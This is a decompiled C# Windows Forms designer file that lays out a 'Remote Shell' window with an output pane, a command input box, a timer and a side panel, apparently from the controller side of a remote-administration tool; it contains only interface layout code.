﻿namespace Server.Forms
{
	// Token: 0x0200009D RID: 157
	public partial class FormShell : global::System.Windows.Forms.Form
	{
		// Token: 0x060004E5 RID: 1253 RVA: 0x0000492C File Offset: 0x00002B2C
		protected override void Dispose(bool disposing)
		{
			if (disposing && this.components != null)
			{
				this.components.Dispose();
			}
			base.Dispose(disposing);
		}

		// Token: 0x060004E6 RID: 1254 RVA: 0x00031778 File Offset: 0x0002F978
		private void InitializeComponent()
		{
			this.components = new global::System.ComponentModel.Container();
			this.richTextBox1 = new global::System.Windows.Forms.RichTextBox();
			this.textBox1 = new global::System.Windows.Forms.TextBox();
			this.timer1 = new global::System.Windows.Forms.Timer(this.components);
			this.panel1 = new global::System.Windows.Forms.Panel();
			base.SuspendLayout();
			this.richTextBox1.Anchor = (global::System.Windows.Forms.AnchorStyles.Top | global::System.Windows.Forms.AnchorStyles.Bottom | global::System.Windows.Forms.AnchorStyles.Left | global::System.Windows.Forms.AnchorStyles.Right);
			this.richTextBox1.BackColor = global::System.Drawing.Color.FromArgb(40, 42, 54);
			this.richTextBox1.BorderStyle = global::System.Windows.Forms.BorderStyle.None;
			this.richTextBox1.Font = new global::System.Drawing.Font("Consolas", 8f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
			this.richTextBox1.ForeColor = global::System.Drawing.Color.FromArgb(248, 248, 242);
			this.richTextBox1.Location = new global::System.Drawing.Point(0, 0);
			this.richTextBox1.Margin = new global::System.Windows.Forms.Padding(2);
			this.richTextBox1.Name = "richTextBox1";
			this.richTextBox1.ReadOnly = true;
			this.richTextBox1.Size = new global::System.Drawing.Size(533, 268);
			this.richTextBox1.TabIndex = 0;
			this.richTextBox1.Text = "";
			this.textBox1.BackColor = global::System.Drawing.Color.FromArgb(248, 248, 242);
			this.textBox1.Dock = global::System.Windows.Forms.DockStyle.Bottom;
			this.textBox1.Font = new global::System.Drawing.Font("Consolas", 8f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
			this.textBox1.ForeColor = global::System.Drawing.Color.FromArgb(40, 42, 54);
			this.textBox1.Location = new global::System.Drawing.Point(31, 271);
			this.textBox1.Margin = new global::System.Windows.Forms.Padding(2);
			this.textBox1.Name = "textBox1";
			this.textBox1.Size = new global::System.Drawing.Size(502, 20);
			this.textBox1.TabIndex = 1;
			this.textBox1.KeyDown += new global::System.Windows.Forms.KeyEventHandler(this.TextBox1_KeyDown);
			this.timer1.Interval = 1000;
			this.timer1.Tick += new global::System.EventHandler(this.Timer1_Tick);
			this.panel1.BackColor = global::System.Drawing.Color.FromArgb(40, 42, 54);
			this.panel1.Dock = global::System.Windows.Forms.DockStyle.Left;
			this.panel1.Location = new global::System.Drawing.Point(0, 0);
			this.panel1.Name = "panel1";
			this.panel1.Size = new global::System.Drawing.Size(31, 291);
			this.panel1.TabIndex = 2;
			base.AutoScaleDimensions = new global::System.Drawing.SizeF(6f, 13f);
			base.AutoScaleMode = global::System.Windows.Forms.AutoScaleMode.Font;
			this.BackColor = global::System.Drawing.Color.FromArgb(40, 42, 54);
			base.ClientSize = new global::System.Drawing.Size(533, 291);
			base.Controls.Add(this.richTextBox1);
			base.Controls.Add(this.textBox1);
			base.Controls.Add(this.panel1);
			base.Margin = new global::System.Windows.Forms.Padding(2);
			base.Name = "FormShell";
			this.Text = "Remote Shell";
			base.FormClosed += new global::System.Windows.Forms.FormClosedEventHandler(this.FormShell_FormClosed);
			base.ResumeLayout(false);
			base.PerformLayout();
		}

		// Token: 0x0400040D RID: 1037
		private global::System.ComponentModel.IContainer components;

		// Token: 0x0400040E RID: 1038
		private global::System.Windows.Forms.TextBox textBox1;

		// Token: 0x0400040F RID: 1039
		public global::System.Windows.Forms.RichTextBox richTextBox1;

		// Token: 0x04000410 RID: 1040
		private global::System.Windows.Forms.Panel panel1;

		// Token: 0x04000411 RID: 1041
		public global::System.Windows.Forms.Timer timer1;
	}
}
